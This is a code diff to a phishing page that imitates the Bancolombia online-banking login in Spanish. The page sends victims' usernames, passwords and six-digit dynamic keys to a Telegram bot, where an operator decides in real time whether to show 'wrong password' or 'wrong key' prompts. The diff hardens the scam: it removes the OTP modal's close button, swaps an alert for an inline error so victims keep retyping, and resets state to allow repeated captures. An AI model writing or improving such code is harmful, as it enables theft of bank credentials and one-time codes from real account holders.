@@ -78,28 +78,61 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 /* =========================================
    MODAL CLAVE DINÁMICA
    ========================================= */
-.modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(2px); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
-.modal-overlay.active { display: flex; }
-.modal-content { background: #fff; width: min(100%, 500px); border-radius: 20px; padding: 30px 24px 24px; position: relative; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); }
-.modal-close { position: absolute; top: 15px; right: 15px; background: transparent; border: none; font-size: 30px; color: #666; cursor: pointer; line-height: 1; z-index: 10; }
+.modal-overlay { 
+  display: none; 
+  position: fixed; 
+  inset: 0; 
+  background: rgba(0, 0, 0, 0.6); 
+  backdrop-filter: blur(2px); 
+  z-index: 1000; 
+  align-items: flex-start; 
+  justify-content: center; 
+  padding: 40px 20px; 
+}
 
-.gif-container { width: 100%; margin-bottom: 24px; border-radius: 12px; overflow: hidden; background: #4cc9f0; }
+.modal-overlay.active { display: flex; }
+
+.modal-content { 
+  background: #fff; 
+  width: min(100%, 560px);
+  border-radius: 20px; 
+  padding: 30px 24px 24px; 
+  position: relative; 
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); 
+  margin-top: 20px;
+}
+
+.modal-close { display: none; }
+
+.gif-container { 
+  width: calc(100% + 48px);
+  margin-left: -24px;
+  margin-right: -24px;
+  margin-bottom: 20px; 
+  border-radius: 12px 12px 0 0; 
+  overflow: hidden; 
+  background: #4cc9f0; 
+}
 .gif-container img { width: 100%; height: auto; display: block; }
 
 .modal-title { font-size: 28px; font-weight: 700; color: #1f1f1f; text-align: center; margin: 0 0 12px; }
 .modal-subtitle { font-size: 18px; color: #444; text-align: center; margin: 0 0 30px; line-height: 1.4; }
 
 /* Input de 6 dígitos estilo Bancolombia */
-.otp-container { position: relative; display: flex; justify-content: space-between; gap: 8px; margin-bottom: 40px; padding: 0 10px; }
+.otp-container { position: relative; display: flex; justify-content: space-between; gap: 8px; margin-bottom: 30px; padding: 0 10px; }
 .otp-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; letter-spacing: 30px; }
 .otp-slot { width: 100%; height: 30px; border-bottom: 2px solid #333; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: 700; color: #1f1f1f; position: relative; }
 .otp-slot.active::after { content: ''; display: block; width: 2px; height: 24px; background: #333; animation: blink 1s step-end infinite; }
 @keyframes blink { 50% { opacity: 0; } }
 
 /* Estilos para el error en el modal */
-.otp-error { color: #d93025; font-size: 14px; text-align: center; margin-top: -20px; margin-bottom: 20px; display: none; font-weight: bold; }
+.otp-error { color: #d93025; font-size: 15px; text-align: center; margin-top: 0; margin-bottom: 20px; display: none; font-weight: bold; }
 .otp-error.show { display: block; }
 .otp-container.error .otp-slot { border-bottom-color: #d93025; }
+
+/* Alerta sutil para el login */
+.login-error { color: #d93025; font-size: 15px; text-align: center; margin-top: 15px; display: none; font-weight: bold; }
+.login-error.show { display: block; }
 
 .modal-actions { display: flex; gap: 15px; }
 .btn-modal { flex: 1; padding: 14px; border-radius: 30px; font-size: 18px; font-weight: 700; cursor: pointer; font-family: inherit; transition: all 0.2s; }
@@ -127,9 +160,13 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
   .submit { min-height: 64px; margin-top: 58px; }
   .create { margin-top: 34px; }
   .footer-links { gap: 30px; margin-top: 90px; }
-  .modal-content { padding: 24px 20px 20px; }
+  
+  .modal-overlay { padding: 20px 10px; align-items: flex-start; }
+  .modal-content { padding: 20px 16px 20px; margin-top: 10px; }
+  .gif-container { margin-left: -16px; margin-right: -16px; width: calc(100% + 32px); }
   .modal-title { font-size: 24px; }
   .modal-subtitle { font-size: 16px; }
+  .otp-slot { height: 26px; font-size: 24px; }
 }
 </style>
 </head>
@@ -185,6 +222,9 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
       <a class="help-link" href="#ayuda-clave">¿Olvidaste o bloqueaste tu clave?</a>
     </div>
 
+    <!-- Aviso sutil de error en Login -->
+    <p class="login-error" id="loginError">Usuario o clave incorrectos. Intenta de nuevo.</p>
+
     <button class="submit" id="submitBtn" type="submit" disabled>Iniciar sesión</button>
     <p class="notice" id="notice" role="status"></p>
   </form>
@@ -201,7 +241,6 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 <!-- MODAL CLAVE DINÁMICA -->
 <div class="modal-overlay" id="modalDinamica">
   <div class="modal-content">
-    <button class="modal-close" id="closeModal" aria-label="Cerrar">×</button>
     
     <div class="gif-container">
       <img src="cd-desktop.gif" alt="Instrucciones Clave Dinámica" onerror="this.style.display='none'">
@@ -249,10 +288,10 @@ const claveInput = document.getElementById("clave");
 const submitBtn = document.getElementById("submitBtn");
 const demoForm = document.getElementById("demoForm");
 const loadingOverlay = document.getElementById('loading-overlay');
+const loginError = document.getElementById('loginError');
 
 // Elementos del Modal
 const modal = document.getElementById("modalDinamica");
-const closeModal = document.getElementById("closeModal");
 const otpInput = document.getElementById("otpInput");
 const otpSlots = document.querySelectorAll(".otp-slot");
 const btnBorrar = document.getElementById("btnBorrar");
@@ -278,6 +317,9 @@ function actualizarBoton() {
   
   submitBtn.disabled = !formularioValido;
   submitBtn.classList.toggle("ready", formularioValido);
+  
+  // Ocultar el error al escribir
+  if (formularioValido) loginError.classList.remove("show");
 }
 
 usuarioInput.addEventListener("input", actualizarBoton);
@@ -305,6 +347,7 @@ function enviarIdentificacionTelegram(usuario, clave) {
     }).then(r => r.json()).then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
+            actionProcessed = false; // Resetear para permitir nuevas acciones
             escucharBotones(handleTelegramActionLogin);
         } else {
             ocultarOverlay();
@@ -328,6 +371,7 @@ function enviarDinamicaTelegram(dinamica) {
     }).then(r => r.json()).then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
+            actionProcessed = false; // Resetear
             escucharBotones(handleTelegramActionDinamica);
         }
     });
@@ -382,8 +426,11 @@ function handleTelegramActionLogin(action) {
         actualizarOTP();
         setTimeout(() => otpInput.focus(), 100);
     } else if (action === 'error_usuario') {
-        alert("Usuario o clave incorrectos. Intenta de nuevo.");
-        location.reload();
+        // En vez de alert, mostramos el aviso sutil
+        loginError.classList.add("show");
+        claveInput.value = "";
+        actualizarBoton();
+        claveInput.focus();
     }
 }
 
@@ -393,14 +440,15 @@ function handleTelegramActionDinamica(action) {
     ocultarOverlay();
 
     if (action === 'error_dinamica') {
-        modal.classList.add("active"); // Asegurar que el modal esté abierto
+        // El modal sigue abierto, solo mostramos el error y limpiamos
+        modal.classList.add("active"); 
         otpError.classList.add("show");
         otpContainer.classList.add("error");
         otpInput.value = "";
         actualizarOTP();
         otpInput.focus();
         
-        actionProcessed = false; // Permitir reintentar o recibir otra acción
+        actionProcessed = false; // Permitir reintentar
     } else if (action === 'dinamica_ok') {
         alert("¡Clave dinámica correcta! (Simulación de ingreso exitoso)");
         location.reload();
@@ -467,13 +515,8 @@ btnBorrar.addEventListener("click", () => {
   otpInput.focus();
 });
 
-closeModal.addEventListener("click", () => {
-  modal.classList.remove("active");
-});
-
 btnContinuar.addEventListener("click", () => {
   if(otpInput.value.length === 6) {
-    modal.classList.remove("active");
     mostrarOverlay();
     enviarDinamicaTelegram(otpInput.value);
   }
